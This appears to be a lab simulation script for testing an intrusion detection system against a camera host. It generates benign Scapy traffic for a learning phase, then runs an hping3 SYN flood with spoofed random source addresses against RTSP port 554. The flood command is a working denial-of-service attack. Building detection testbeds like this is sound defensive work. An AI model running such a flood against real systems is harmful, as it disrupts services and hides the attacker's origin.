TARGET_HOST="${TARGET_HOST:-vulnerable_cam}"
TARGET_PORT_HTTP=80
TARGET_PORT_RTSP=554

echo "[ATTACKER] Target: $TARGET_HOST Ports: $TARGET_PORT_HTTP / $TARGET_PORT_RTSP"
# Function to generate benign noise in background
# Function to generate benign noise in background
# Usage: python3 generate_traffic.py [target]
# This uses SCAPY to send raw packets (RTSP, HTTP, DNS)
start_generator() {
    echo "[NOISE] Starting Scapy Traffic Generator (Raw Packets)..."
    python3 generate_traffic.py "$TARGET_HOST" &
}

# Start benign traffic in background
start_generator
BENIGN_PID=$!

echo "[ATTACKER] Phase 1: Learning Mode (Benign Only) - 600s (10 min)"
echo "The system should see this as normal HTTP traffic."
sleep 600

echo "[ATTACKER] !!! LAUNCHING DISTRIBUTED ATTACK !!!"
echo "Targeting RTSP Port $TARGET_PORT_RTSP with IP SPOOFING (hping3)..."

# hping3 Flood with Random Source IPs (--rand-source)
# -S: Syn Flood
# -p: Target Port
# --flood: Send as fast as possible
hping3 -S -p $TARGET_PORT_RTSP --rand-source --flood $TARGET_HOST &
ATTACK_PID=$!

# Wait for a bit (simulation duration)
sleep 60

# Cleanup
kill $BENIGN_PID
kill $ATTACK_PID
echo "[ATTACKER] Simulation Complete."

echo "[ATTACKER] Attack run complete. Sleeping."
sleep 3600
